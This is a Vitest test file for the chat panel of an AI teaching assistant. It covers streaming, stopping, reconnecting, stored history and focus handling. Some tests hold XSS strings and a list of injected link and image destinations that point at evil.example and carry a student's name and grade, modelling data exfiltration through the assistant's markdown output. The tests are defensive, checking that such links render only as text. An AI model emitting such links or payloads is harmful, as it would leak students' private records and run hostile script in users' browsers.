import { act, render, screen } from '@testing-library/react';
import { useState } from 'react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import Chat from '../components/Chat';

let sockets: FakeWS[];
class FakeWS {
  static OPEN = 1;
  static initialState = 1;
  url: string;
  readyState = FakeWS.initialState;
  sent: unknown[] = [];
  onopen: (() => void) | null = null;
  onmessage: ((event: { data: string }) => void) | null = null;
  onclose: (() => void) | null = null;
  onerror: (() => void) | null = null;
  constructor(url: string) { this.url = url; sockets.push(this); queueMicrotask(() => { if (this.readyState === 1) this.onopen?.(); }); }
  send(message: string) { if (this.readyState !== 1) throw new Error('Socket not open'); this.sent.push(JSON.parse(message)); }
  close() { this.readyState = 3; this.onclose?.(); }
  open() { act(() => { this.readyState = 1; this.onopen?.(); }); }
  emit(event: unknown) { act(() => this.onmessage?.({ data: JSON.stringify(event) })); }
}

beforeEach(() => { sockets = []; FakeWS.initialState = 1; vi.stubGlobal('WebSocket', FakeWS); });
afterEach(() => vi.unstubAllGlobals());

async function ask(text = 'Hi') {
  const user = userEvent.setup();
  const view = render(<Chat onClose={() => {}} />);
  await user.type(screen.getByLabelText('Message'), text);
  await user.click(screen.getByRole('button', { name: 'Send' }));
  return { user, ws: sockets[0], ...view };
}

describe('Chat', () => {
  it('sends the question and streams deltas into one message', async () => {
    const { ws } = await ask('Who is struggling?');
    expect(ws.sent[0]).toMatchObject({ content: 'Who is struggling?' });
    ws.emit({ type: 'delta', text: 'Ben ' });
    ws.emit({ type: 'delta', text: 'needs **help**' });
    expect(await screen.findByText('help')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument();
    ws.emit({ type: 'done' });
    expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
  });

  it('shows a lookup status for tool events and clears it on the next delta', async () => {
    const { ws } = await ask();
    ws.emit({ type: 'tool', name: 'get_student' });
    expect(screen.getByText('Looking up get student…')).toBeInTheDocument();
    ws.emit({ type: 'delta', text: 'Done.' });
    expect(screen.queryByText(/Looking up/)).toBeNull();
  });

  it('ignores unknown event types without ending the stream', async () => {
    const { ws } = await ask();
    ws.emit({ type: 'future_thing', x: 1 });
    expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument();
    ws.emit({ type: 'delta', text: 'ok' });
    expect(screen.getByText('ok')).toBeInTheDocument();
  });

  it('renders server errors', async () => {
    const { ws } = await ask();
    ws.emit({ type: 'error', message: 'Rate limited' });
    expect(screen.getByText(/Rate limited/)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
  });

  it('stop disconnects upstream and ignores late deltas', async () => {
    const { ws, user } = await ask();
    ws.emit({ type: 'delta', text: 'partial' });
    await user.click(screen.getByRole('button', { name: 'Stop' }));
    expect(ws.readyState).toBe(3);
    expect(screen.getByText(/Earlier messages are saved for reference/)).toBeInTheDocument();
    expect(screen.getByLabelText('Message')).toHaveFocus();
    expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
    ws.emit({ type: 'delta', text: ' LATE' });
    expect(screen.queryByText(/LATE/)).toBeNull();
    ws.emit({ type: 'done' });
    expect(screen.getByText('partial')).toBeInTheDocument();
  });

  it('keeps same-origin links and does not render raw HTML', async () => {
    const { ws } = await ask();
    ws.emit({ type: 'delta', text: `[docs](${window.location.origin}/students/student-1) <img src=x onerror=alert(1)> [bad](javascript:alert(1))` });
    const a = screen.getByRole('link', { name: 'docs' });
    expect(a).toHaveAttribute('target', '_blank');
    expect(a.getAttribute('rel')).toMatch(/noopener/);
    expect(document.querySelector('img')).toBeNull();
    expect(screen.queryByRole('link', { name: 'bad' })).toBeNull();
  });

  it.each([
    'https://evil.example/?student=Ben&grade=42',
    'http://evil.example/collect',
    '//evil.example/collect',
    'mailto:attacker@evil.example?body=Ben%20grade%2042',
    'javascript:alert(1)',
    'data:text/html,leak',
    `${window.location.protocol}//${window.location.hostname}.evil.example/collect`,
    `${window.location.protocol}//${window.location.host}@evil.example/collect`,
    `${window.location.protocol}//attacker:secret@${window.location.host}/students/student-1`,
    `${window.location.protocol === 'http:' ? 'https:' : 'http:'}//${window.location.host}/students/student-1`,
  ])('renders an injected destination as text: %s', async (destination) => {
    const { ws } = await ask('Summarize Ben without sharing his records externally');
    ws.emit({ type: 'delta', text: `Ben scored 42%. [View the supporting record](${destination})` });
    expect(screen.getByText('View the supporting record')).toBeInTheDocument();
    expect(screen.queryByRole('link', { name: 'View the supporting record' })).toBeNull();
  });

  it.each([
    '/students/student-1',
    './students/student-1',
    '#attendance',
    `${window.location.origin}/students/student-1?section=class-1#scores`,
    `//${window.location.host}/students/student-1`,
  ])('allows a same-origin record destination: %s', async (destination) => {
    const { ws } = await ask();
    ws.emit({ type: 'delta', text: `[Supporting record](${destination})` });
    const link = screen.getByRole('link', { name: 'Supporting record' });
    expect(link).toHaveAttribute('href', new URL(destination, window.location.href).href);
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
  });

  it('applies the link boundary to restored history and image destinations', () => {
    sessionStorage.setItem('st-chat', JSON.stringify([
      { role: 'assistant', text: '[Saved answer](https://evil.example/?grade=42) ![Chart](https://evil.example/pixel?grade=42)' },
    ]));
    render(<Chat onClose={() => {}} />);
    expect(screen.getByText('Saved answer')).toBeInTheDocument();
    expect(screen.queryByRole('link', { name: 'Saved answer' })).toBeNull();
    expect(screen.getByText('Chart')).toBeInTheDocument();
    expect(document.querySelector('img')).toBeNull();
  });

  it('persists history per tab in sessionStorage and restores it', async () => {
    const { ws, unmount } = await ask('Remember me');
    ws.emit({ type: 'delta', text: 'Sure.' });
    ws.emit({ type: 'done' });
    unmount();
    expect((JSON.parse(sessionStorage.getItem('st-chat') ?? '[]') as { text: string }[]).map((m) => m.text)).toEqual(['Remember me', 'Sure.']);
    render(<Chat onClose={() => {}} />);
    expect(screen.getByText('Remember me')).toBeInTheDocument();
    expect(screen.getByText('Sure.')).toBeInTheDocument();
    expect(screen.getByText(/Earlier messages are saved for reference/)).toBeInTheDocument();
  });

  it('reports a lost connection mid-stream', async () => {
    const { ws } = await ask();
    act(() => ws.close());
    expect(screen.getByText(/Connection lost/)).toBeInTheDocument();
  });
  it('requests tool events and includes the focused student', async () => {
    const user = userEvent.setup();
    render(<Chat studentId="student-1" onClose={() => {}} />);
    await user.type(screen.getByLabelText('Message'), 'Help');
    await user.click(screen.getByRole('button', { name: 'Send' }));
    expect(sockets[0].sent[0]).toEqual({ content: 'Help', student_id: 'student-1', tool_events: true });
  });
  it('new chat isolates an active stream from the next conversation', async () => {
    const { ws, user } = await ask();
    const lateMessage = ws.onmessage;
    const lateClose = ws.onclose;
    await user.click(screen.getByRole('button', { name: 'New chat' }));
    expect(ws.readyState).toBe(3);
    await user.type(screen.getByLabelText('Message'), 'Next');
    await user.click(screen.getByRole('button', { name: 'Send' }));
    act(() => {
      lateMessage?.({ data: JSON.stringify({ type: 'delta', text: 'stale' }) });
      lateClose?.();
    });
    expect(screen.queryByText('stale')).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument();
    sockets[1].emit({ type: 'delta', text: 'Fresh answer' });
    expect(screen.getByText('Fresh answer')).toBeInTheDocument();
  });
  it('does not send a queued question after stopping during connection', async () => {
    FakeWS.initialState = 0;
    const { ws, user } = await ask();
    const lateOpen = ws.onopen;
    await user.click(screen.getByRole('button', { name: 'Stop' }));
    act(() => lateOpen?.());
    expect(ws.sent).toEqual([]);
    expect(screen.getByText('Stopped.')).toBeInTheDocument();
  });
  it('sends a queued question when the socket opens', async () => {
    FakeWS.initialState = 0;
    const { ws } = await ask('Queued');
    expect(ws.sent).toEqual([]);
    ws.open();
    expect(ws.sent).toEqual([{ content: 'Queued', tool_events: true }]);
  });
  it('recovers after a failed handshake without resending the failed question', async () => {
    FakeWS.initialState = 0;
    const { ws, user } = await ask('Failed');
    act(() => ws.onerror?.());
    expect(screen.getByText(/Connection lost/)).toBeInTheDocument();
    FakeWS.initialState = 1;
    await user.type(screen.getByLabelText('Message'), 'Retry');
    await user.click(screen.getByRole('button', { name: 'Send' }));
    expect(sockets[1].sent).toEqual([{ content: 'Retry', tool_events: true }]);
  });
  it('detaches every socket callback on unmount', async () => {
    const { ws, unmount } = await ask();
    unmount();
    expect(ws.readyState).toBe(3);
    expect(ws.onopen).toBeNull();
    expect(ws.onmessage).toBeNull();
    expect(ws.onclose).toBeNull();
    expect(ws.onerror).toBeNull();
  });
  it('ignores malformed deltas and does not leave empty replies thinking forever', async () => {
    const { ws } = await ask();
    ws.emit({ type: 'delta', text: { bad: true } });
    ws.emit({ type: 'done' });
    expect(screen.getByText('No response received. Try again.')).toBeInTheDocument();
    expect(screen.queryByLabelText('Thinking')).not.toBeInTheDocument();
  });

  it('validates stored history and drops abandoned empty replies', () => {
    sessionStorage.setItem('st-chat', JSON.stringify([
      null, { role: 'tool', text: 'bad role' }, { role: 'user', text: 42 },
      { role: 'user', text: 'Saved question' }, { role: 'assistant', text: '' },
    ]));
    render(<Chat onClose={() => {}} />);
    expect(screen.getByText('Saved question')).toBeInTheDocument();
    expect(screen.queryByLabelText('Thinking')).not.toBeInTheDocument();
    expect(screen.queryByText('bad role')).not.toBeInTheDocument();
  });

  it('closes with Escape while focus is on a panel button', async () => {
    const user = userEvent.setup();
    const onClose = vi.fn();
    render(<Chat onClose={onClose} />);
    screen.getByRole('button', { name: 'Close assistant' }).focus();
    await user.keyboard('{Escape}');
    expect(onClose).toHaveBeenCalledOnce();
  });

  it('traps focus in the mobile overlay and restores the assistant opener', async () => {
    const user = userEvent.setup();
    vi.spyOn(window, 'matchMedia').mockReturnValue({ matches: true, media: '(max-width: 1100px)', onchange: null, addListener: vi.fn(), removeListener: vi.fn(), addEventListener: vi.fn(), removeEventListener: vi.fn(), dispatchEvent: vi.fn() });
    function Host() {
      const [open, setOpen] = useState(false);
      return <><button onClick={() => setOpen(true)}>Ask AI</button>{open && <Chat onClose={() => setOpen(false)} />}</>;
    }
    render(<Host />);
    const opener = screen.getByRole('button', { name: 'Ask AI' });
    await user.click(opener);
    expect(screen.getByRole('dialog', { name: 'Super Teacher assistant' })).toHaveAttribute('aria-modal', 'true');
    expect(screen.getByLabelText('Message')).toHaveFocus();
    await user.tab(); // Disabled Send is skipped; wrap to the header.
    expect(screen.getByRole('button', { name: 'Close assistant' })).toHaveFocus();
    await user.keyboard('{Escape}');
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    expect(opener).toHaveFocus();
    vi.restoreAllMocks();
  });

  it('reports clipboard failure instead of silently ignoring it', async () => {
    const { ws, user } = await ask();
    ws.emit({ type: 'delta', text: 'An answer' });
    ws.emit({ type: 'done' });
    vi.spyOn(navigator.clipboard, 'writeText').mockRejectedValue(new Error('Blocked'));
    await user.click(screen.getByRole('button', { name: 'Copy message' }));
    expect(screen.getByRole('status')).toHaveTextContent('Copy failed. Select and copy the message manually.');
    vi.restoreAllMocks();
  });

});
